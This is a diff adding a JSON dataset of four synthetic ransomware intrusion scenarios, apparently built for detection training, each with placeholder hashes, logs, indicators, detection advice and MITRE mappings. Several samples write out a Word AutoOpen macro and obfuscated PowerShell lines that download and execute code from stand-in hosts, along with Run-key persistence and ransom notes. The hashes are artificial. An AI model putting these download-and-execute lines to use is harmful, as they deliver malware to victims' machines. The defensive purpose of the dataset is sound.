@@ -1,0 +1,247 @@
+{
+  "samples": [
+    {
+      "scenario": "A Ransomware-as-a-Service affiliate leverages a malicious macro embedded in a Word document to drop a Cobalt Strike beacon which then downloads and executes a ransomware payload. The ransomware uses a custom encryption algorithm and disables Volume Shadow Copy Service to prevent data recovery. The payload communicates over HTTPS with a Tor hidden service C2 for command and key exchange.",
+      "technical_data": {
+        "file_hashes": {
+          "malicious_doc": {
+            "MD5": "7d9d7c8f3a9b1c2d4e5f6780a9b1c2d3",
+            "SHA1": "5e9f3b7d2c4a8e6d1f0b3a7c9e8f4b6a0d1c2e3f",
+            "SHA256": "a3f8e7b6c5d4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8"
+          },
+          "ransomware_exe": {
+            "MD5": "c2b7a4d9e8f6c3a0b1d7e9f4a5c6d8e7",
+            "SHA1": "8d7f6c5a4b3e2d1f0a9c8b7d6e5f4a3b2c1d0e9f",
+            "SHA256": "f1e2d3c4b5a6978877665544332211aa99887766554433221100ffeeddccbbaa"
+          }
+        },
+        "macro_code_snippet": "Sub AutoOpen()\n Dim objShell As Object\n Set objShell = CreateObject(\"WScript.Shell\")\n objShell.Run \"powershell -windowstyle hidden -nop -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.net/loader.ps1')\\\"\"\nEnd Sub",
+        "powershell_loader_script_obfuscated": "$wc=New-Object Net.WebClient;$url='h'+'tt'+'p'+'://'+'malicious.example.net/loader.ps1';$wc.DownloadString($url)|IEX",
+        "registry_changes": [
+          {
+            "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "value_name": "SysUpdate",
+            "value_data": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\Temp\\ransompayload.dll,Start"
+          }
+        ],
+        "process_creation_log_sample": "2024-05-20T09:45:12.789Z Host:CORP-ENDPOINT02 ProcessName: powershell.exe PID: 7832 ParentPID: 6800 CommandLine: powershell -windowstyle hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.net/loader.ps1')\"",
+        "network_traffic": {
+          "http_get_request": "GET /loader.ps1 HTTP/1.1\r\nHost: malicious.example.net\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\nConnection: close\r\n\r\n",
+          "http_response_headers": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 3456\r\nLast-Modified: Mon, 20 May 2024 08:00:00 GMT\r\nConnection: close\r\n\r\n",
+          "dns_query_log": "May 20 09:44:59 dnsmasq[1234]: query[A] malicious.example.net from 192.168.1.105",
+          "c2_communication_pattern": {
+            "protocol": "HTTPS",
+            "host": "q3ewt7h5x3m4r2t5.onion",
+            "uri": "/api/keys",
+            "request_sample": "POST /api/keys HTTP/1.1\r\nHost: q3ewt7h5x3m4r2t5.onion\r\nUser-Agent: CustomClient/1.0\r\nContent-Type: application/json\r\nContent-Length: 150\r\n\r\n{\"host_id\":\"host-1921681105\",\"public_key\":\"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQE...\"}"
+          }
+        },
+        "ransom_note_content": "All your files are encrypted using a strong cipher.\r\nTo decrypt, send an email to recover-files@cock.li with your unique ID: 1921681105.\r\nDo not attempt to restore from backups or shadow copies.",
+        "memory_artifacts_snippet": "Injected DLL: C:\\Windows\\Temp\\ransompayload.dll\nEntryPoint: 0x20002000\nThread injection in explorer.exe (PID 2345)\nSuspicious strings: 'EncryptAll', 'recover-files@cock.li', 'DisableVSS'",
+        "event_log_entries": [
+          "EventID: 4688 Process Creation - New Process Name: rundll32.exe CommandLine: C:\\Windows\\Temp\\ransompayload.dll,Start ParentProcessName: svchost.exe",
+          "EventID: 4663 File Access - Object Name: C:\\Users\\Admin\\Pictures\\Holiday.jpg Access Mask: 0x2 (WRITE_DATA)"
+        ]
+      },
+      "indicators": [
+        "Malicious document macro triggers PowerShell download from malicious.example.net",
+        "Registry persistence created under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run as SysUpdate",
+        "Process chain powershell.exe -> rundll32.exe loading ransompayload.dll",
+        "Outbound HTTPS POST to Tor hidden service q3ewt7h5x3m4r2t5.onion/api/keys",
+        "File hash a3f8e7b6c5d4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8 (malicious document)",
+        "Ransom note referencing recover-files@cock.li"
+      ],
+      "detection_method": "Detect macros in Office documents invoking hidden PowerShell commands; EDR alerts on rundll32.exe loading DLLs from temp directories; Network monitoring for HTTP downloads of PowerShell scripts from uncommon domains; DNS logs for suspicious domain queries; Monitor registry Run keys under HKLM for new entries; Detect HTTPS traffic to Tor .onion services via proxy logs; Identify processes rapidly modifying user documents.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1562.001 - Impair Defenses: Disable or Modify Tools",
+        "T1071.004 - Application Layer Protocol: DNS"
+      ]
+    },
+    {
+      "scenario": "An affiliate in a Ransomware-as-a-Service campaign delivers ransomware via a malicious Windows Installer (.msi) package distributed through compromised software update servers. The installer executes a dropper that injects the ransomware payload into a critical system process to evade detection. The ransomware encrypts files and uses a hardcoded Tor C2 address for receiving encryption keys and instructions.",
+      "technical_data": {
+        "file_hashes": {
+          "malicious_msi": {
+            "MD5": "8b7c6d5e4f3a2910b1c2d3e4f5a6b7c8",
+            "SHA1": "9f8e7d6c5b4a39281716253465748390abcdef12",
+            "SHA256": "d4f5a6b7c8e9f0a1b2c3d4e5f6789ab0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6"
+          },
+          "injected_ransomware_dll": {
+            "MD5": "f1e2d3c4b5a6978877665544332211bb",
+            "SHA1": "aabbccddeeff00112233445566778899aabbccdd",
+            "SHA256": "11223344556677889900aabbccddeeff00112233445566778899aabbccddeeff"
+          }
+        },
+        "installer_command_line": "msiexec /i malicious_update.msi /quiet /qn",
+        "dropper_behavior": "Executes rundll32.exe to load injected_ransomware.dll into svchost.exe process via process hollowing.",
+        "registry_changes": [
+          {
+            "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+            "value_name": "SysCheck",
+            "value_data": "rundll32.exe C:\\Windows\\Temp\\injected_ransomware.dll,Init"
+          }
+        ],
+        "process_creation_log_sample": "2024-05-25T16:30:45.123Z Host:CORP-ENDPOINT03 ProcessName: rundll32.exe PID: 9876 ParentPID: 9000 CommandLine: rundll32.exe C:\\Windows\\Temp\\injected_ransomware.dll,Init",
+        "network_traffic": {
+          "tor_c2_connection": "TCP connection to 127.0.0.1:9050 (Tor SOCKS proxy) with subsequent TLS handshake to hidden service address 'ab12cd34ef56gh78.onion'",
+          "dns_query_log": "May 25 16:30:40 dnsmasq[1234]: query[A] softwareupdate.compromised.net from 192.168.1.110",
+          "http_get_request": "GET /updates/patch.msi HTTP/1.1\r\nHost: softwareupdate.compromised.net\r\nUser-Agent: Windows-Update-Agent/10.0\r\nAccept: application/octet-stream\r\nConnection: close\r\n\r\n"
+        },
+        "ransom_note_content": "Your system has been encrypted.\r\nContact decrypt-support@safe-mail.net with your ID: 1921681110 to receive the decryption key.\r\nPayment must be made within 48 hours.",
+        "memory_artifacts_snippet": "Injected DLL: C:\\Windows\\Temp\\injected_ransomware.dll\nEntryPoint: 0x30003000\nProcess hollowing detected in svchost.exe (PID 5120)\nSuspicious strings: 'EncryptSystem', 'decrypt-support@safe-mail.net', 'TorProxy'",
+        "event_log_entries": [
+          "EventID: 4688 Process Creation - New Process Name: rundll32.exe CommandLine: C:\\Windows\\Temp\\injected_ransomware.dll,Init ParentProcessName: msiexec.exe",
+          "EventID: 4656 Handle Requested - Object Name: C:\\Users\\Public\\Documents\\Finance.xlsx Access Mask: 0x2 (WRITE_DATA)"
+        ]
+      },
+      "indicators": [
+        "Malicious MSI file downloaded from softwareupdate.compromised.net",
+        "Registry RunOnce key for persistence with rundll32.exe loading injected_ransomware.dll",
+        "Process hollowing technique observed with rundll32.exe and svchost.exe",
+        "Tor SOCKS proxy usage with connection to ab12cd34ef56gh78.onion for C2 communication",
+        "File hash d4f5a6b7c8e9f0a1b2c3d4e5f6789ab0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6 (malicious MSI)",
+        "Ransom note referencing decrypt-support@safe-mail.net"
+      ],
+      "detection_method": "Monitor MSI installer usage from non-standard update servers; EDR detection of process hollowing in svchost.exe initiated by rundll32.exe; Investigate registry RunOnce keys for unusual entries; Network detection of Tor proxy usage on endpoints; DNS and HTTP logs for uncommon domain resolutions and file downloads; Detect rapid file encryption activity and suspicious process chains.",
+      "relevant_mitre_techniques": [
+        "T1204.002 - User Execution: Malicious File",
+        "T1055.012 - Process Injection: Process Hollowing",
+        "T1105 - Ingress Tool Transfer",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.003 - Boot or Logon Autostart Execution: Windows Run Once Keys / Startup Folder",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1572 - Protocol Tunneling"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate uses a malicious macro embedded in an Office document to drop a Cobalt Strike beacon, which subsequently downloads and executes a ransomware payload. The multi-stage attack uses encoded PowerShell scripts and living-off-the-land techniques to bypass AV detection, encrypting user files and communicating with a Tor-based C2 infrastructure.",
+      "technical_data": {
+        "file_hashes": {
+          "office_doc": {
+            "MD5": "e2a1f4b9c7d8e0a2f3b4c5d6e7f80123",
+            "SHA1": "f3d2a4b7c8e9f01a234b5c6d7e8f9012a3b4c5d6",
+            "SHA256": "c9b1f0a2e3d4c5b6f7a8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0"
+          },
+          "ransomware_payload": {
+            "MD5": "aabbccddeeff00112233445566778899",
+            "SHA1": "11223344556677889900aabbccddeeff00112233",
+            "SHA256": "ffeeddccbbaa99887766554433221100ffeeddccbbaa99887766554433221100"
+          }
+        },
+        "powershell_command": "powershell -EncodedCommand JABXAD0ATgBlAHcALQBPA... (base64 encoded)",
+        "powershell_obfuscated_script": "$w=(New-Object Net.WebClient);$u='hxxp://malicious.site/payload.exe';$p='$env:TEMP\\payload.exe';$w.DownloadFile($u,$p);Start-Process -FilePath $p",
+        "registry_changes": [
+          {
+            "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "value_name": "SysUpdate",
+            "value_data": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -WindowStyle Hidden -EncodedCommand JABXAD0ATgBlAHcALQBPA..."
+          }
+        ],
+        "process_creation_log_sample": "2024-05-20T09:45:22.789Z Host:CORP-ENDPOINT02 ProcessName: powershell.exe PID: 7128 ParentPID: 6100 CommandLine: powershell -EncodedCommand JABXAD0ATgBlAHcALQBPA...",
+        "network_traffic": {
+          "http_get_request": "GET /payload.exe HTTP/1.1\r\nHost: malicious.site\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\nConnection: close\r\n\r\n",
+          "http_response_headers": "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 40960\r\nConnection: close\r\n\r\n",
+          "dns_query_log": "May 20 09:45:18 dnsmasq[1234]: query[A] malicious.site from 10.0.0.15",
+          "c2_communication_pattern": {
+            "protocol": "Tor",
+            "host": "3g2upl4pq6kufc4m.onion",
+            "uri": "/beacon",
+            "request_sample": "POST /beacon HTTP/1.1\r\nHost: 3g2upl4pq6kufc4m.onion\r\nUser-Agent: curl/7.68.0\r\nContent-Type: application/octet-stream\r\nContent-Length: 256\r\n\r\n{encrypted_beacon_data}"
+          }
+        },
+        "ransom_note_content": "All your files have been encrypted!\r\nTo get the decryption key, send 1 Bitcoin to the address below and email your ID: abc123@protonmail.com.\r\nIf you do not pay within 48 hours, your data will be lost forever.",
+        "memory_artifacts_snippet": "Injected thread in explorer.exe (PID 2300)\nLoaded modules: C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe\nSuspicious strings: 'EncryptData', 'Bitcoin', 'abc123@protonmail.com'",
+        "event_log_entries": [
+          "EventID: 4688 Process Creation - New Process Name: powershell.exe CommandLine: powershell -EncodedCommand JABXAD0ATgBlAHcALQBPA... ParentProcessName: winword.exe",
+          "EventID: 4663 File Access - Object Name: C:\\Users\\User\\Pictures\\image.jpg Access Mask: 0x2 (WRITE_DATA)"
+        ]
+      },
+      "indicators": [
+        "Domain malicious.site hosting ransomware payload",
+        "Encoded PowerShell command execution via Office macro",
+        "Registry persistence under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with obfuscated PowerShell",
+        "Process chain winword.exe -> powershell.exe -> payload.exe",
+        "Outbound Tor network beacon to 3g2upl4pq6kufc4m.onion",
+        "File hash ffeeddccbbaa99887766554433221100ffeeddccbbaa99887766554433221100 (ransomware payload)",
+        "Ransom note referencing abc123@protonmail.com"
+      ],
+      "detection_method": "Detect Office documents with macros spawning encoded PowerShell commands; Monitor PowerShell executions with network downloads; Endpoint Detection and Response (EDR) alerts on suspicious process chains involving winword.exe and powershell.exe; Network detection of Tor traffic; Monitor registry run keys for unusual PowerShell commands; Analyze file system activity for rapid modification of user data files.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1090.003 - Proxy: Tor",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1105 - Ingress Tool Transfer",
+        "T1486 - Data Encrypted for Impact",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate leverages a compromised RDP session to deploy a C# based ransomware executable. Initial access is established via brute-force RDP attack. The ransomware uses a custom mutex and communicates with a cloud-based C2 server over HTTPS to retrieve encryption keys. The malware also deletes shadow copies to prevent recovery.",
+      "technical_data": {
+        "file_hashes": {
+          "ransomware_exe": {
+            "MD5": "77e4a4f6d5c3b2a1e0f9d8c7b6a54321",
+            "SHA1": "aabbccddeeff0011223344556677889900aabbcc",
+            "SHA256": "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
+          }
+        },
+        "powershell_command": null,
+        "powershell_obfuscated_script": null,
+        "registry_changes": [
+          {
+            "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "value_name": "WindowsDefender",
+            "value_data": "\"C:\\Users\\Public\\defender.exe\""
+          }
+        ],
+        "process_creation_log_sample": "2024-05-22T22:30:45.123Z Host:CORP-ENDPOINT03 ProcessName: defender.exe PID: 8340 ParentPID: 4000 CommandLine: C:\\Users\\Public\\defender.exe",
+        "network_traffic": {
+          "http_get_request": null,
+          "http_response_headers": null,
+          "dns_query_log": "May 22 22:30:40 dnsmasq[1234]: query[A] cloud-control.net from 192.168.10.25",
+          "c2_communication_pattern": {
+            "protocol": "HTTPS",
+            "host": "cloud-control.net",
+            "uri": "/api/getkey",
+            "request_sample": "POST /api/getkey HTTP/1.1\r\nHost: cloud-control.net\r\nUser-Agent: ransomware-agent/1.0\r\nContent-Type: application/json\r\nContent-Length: 64\r\n\r\n{\"host_id\":\"CORP-ENDPOINT03\",\"session_token\":\"abcdef123456\"}"
+          }
+        },
+        "ransom_note_content": "Your files have been encrypted.\r\nTo recover them, send 2 BTC to the following wallet and email us at recover@securemail.com with your ID.\r\nAll shadow copies have been deleted.",
+        "memory_artifacts_snippet": "Mutex created: Global\\RansomwareMutex\nInjected thread in svchost.exe (PID 3500)\nSuspicious strings: 'EncryptData', 'recover@securemail.com', 'DeleteShadowCopies'",
+        "event_log_entries": [
+          "EventID: 4624 Logon - Account Name: attacker Account Domain: WORKGROUP Logon Type: 10 (RemoteInteractive)",
+          "EventID: 4688 Process Creation - New Process Name: defender.exe CommandLine: C:\\Users\\Public\\defender.exe ParentProcessName: svchost.exe",
+          "EventID: 4663 File Access - Object Name: C:\\Users\\User\\Documents\\Important.xlsx Access Mask: 0x2 (WRITE_DATA)"
+        ]
+      },
+      "indicators": [
+        "RDP brute-force login detected for user 'attacker'",
+        "Persistence via HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with executable defender.exe in public user folder",
+        "Process defender.exe running with parent svchost.exe",
+        "HTTPS POST to cloud-control.net/api/getkey with ransomware-agent user agent",
+        "File hash 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef (ransomware executable)",
+        "Ransom note referencing recover@securemail.com",
+        "Shadow copies deletion observed"
+      ],
+      "detection_method": "Monitor for multiple failed RDP login attempts and successful logins; Detect unknown executables in user public folders with persistence registry entries; Endpoint detection on processes spawning from svchost.exe with suspicious behavior; Network monitoring for HTTPS connections to rare cloud-control.net domain; File system monitoring for mass file modifications and shadow copy deletion events.",
+      "relevant_mitre_techniques": [
+        "T1078.002 - Valid Accounts: Domain Accounts",
+        "T1021.001 - Remote Services: Remote Desktop Protocol",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1486 - Data Encrypted for Impact",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1105 - Ingress Tool Transfer",
+        "T1562.001 - Impair Defenses: Disable or Modify Tools",
+        "T1490 - Inhibit System Recovery"
+      ]
+    }
+  ]
+}
